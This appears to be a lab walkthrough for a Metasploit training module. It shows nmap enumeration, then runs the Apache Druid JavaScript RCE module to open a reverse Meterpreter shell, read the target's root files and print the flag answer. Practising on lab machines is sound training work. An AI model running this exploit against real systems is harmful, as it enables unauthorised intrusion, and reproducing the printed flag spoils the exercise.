# Section 06: Payloads

Module: 09. Using the Metasploit Framework

---

## Questions & Answers

### 1. Exploit the Apache Druid service and find the flag.txt file. Submit the contents of this file as the answer.

Context:
- Emuneration:
```bash
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 71:08:b0:c4:f3:ca:97:57:64:97:70:f9:fe:c5:0c:7b (RSA)
|   256 45:c3:b5:14:63:99:3d:9e:b3:22:51:e5:97:76:e1:50 (ECDSA)
|_  256 2e:c2:41:66:46:ef:b6:81:95:d5:aa:35:23:94:55:38 (ED25519)
8082/tcp open  http    Jetty 9.4.12.v20180830
|_http-title: Site doesn't have a title.
|_http-server-header: Jetty(9.4.12.v20180830)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
- Exploit:
```bash
[msf](Jobs:0 Agents:0) exploit(linux/http/apache_druid_js_rce) >> set LHOST 10.10.15.113
LHOST => 10.10.15.113
[msf](Jobs:0 Agents:0) exploit(linux/http/apache_druid_js_rce) >> set RHOSTS 10.129.150.160
RHOSTS => 10.129.150.160
[msf](Jobs:0 Agents:0) exploit(linux/http/apache_druid_js_rce) >> run
[*] Started reverse TCP handler on 10.10.15.113:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
[*] Using URL: http://10.10.15.113:8080/Hhd5ZAZnL0aK0
[*] Client 10.129.150.160 (curl/7.68.0) requested /Hhd5ZAZnL0aK0
[*] Sending payload to 10.129.150.160 (curl/7.68.0)
[*] Sending stage (3090404 bytes) to 10.129.150.160
[*] Meterpreter session 1 opened (10.10.15.113:4444 -> 10.129.150.160:50290) at 2026-07-31 02:57:51 -0400
[*] Command Stager progress - 100.00% done (118/118 bytes)
[*] Server stopped.

(Meterpreter 1)(/root/druid) > shell
Process 2156 created.
Channel 1 created.
ls
LICENSE
NOTICE
README
bin
conf
extensions
hadoop-dependencies
lib
licenses
quickstart
var
```
```bash
(Meterpreter 1)(/root/druid) > ls ..
Listing: ..
===========

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100600/rw-------  168   fil   2022-05-16 07:07:41 -0400  .bash_history
100644/rw-r--r--  3137  fil   2022-05-11 09:43:25 -0400  .bashrc
040700/rwx------  4096  dir   2022-05-16 07:04:45 -0400  .cache
040700/rwx------  4096  dir   2022-05-16 06:54:48 -0400  .config
100644/rw-r--r--  161   fil   2019-12-05 09:39:21 -0500  .profile
100644/rw-r--r--  75    fil   2022-05-16 04:45:33 -0400  .selected_editor
040700/rwx------  4096  dir   2021-10-06 13:37:09 -0400  .ssh
100644/rw-r--r--  212   fil   2022-05-11 10:10:43 -0400  .wget-hsts
040755/rwxr-xr-x  4096  dir   2022-05-11 08:51:45 -0400  druid
100755/rwxr-xr-x  95    fil   2022-05-16 06:31:10 -0400  druid.sh
100644/rw-r--r--  22    fil   2022-05-16 06:01:15 -0400  flag.txt
040755/rwxr-xr-x  4096  dir   2021-10-06 13:37:19 -0400  snap

(Meterpreter 1)(/root/druid) > cat ../flag.txt
HTB{MSF_Expl01t4t10n}
(Meterpreter 1)(/root/druid) > 
```
**Answer:** `HTB{MSF_Expl01t4t10n}`

---

[Back to Module Index](./README.md)
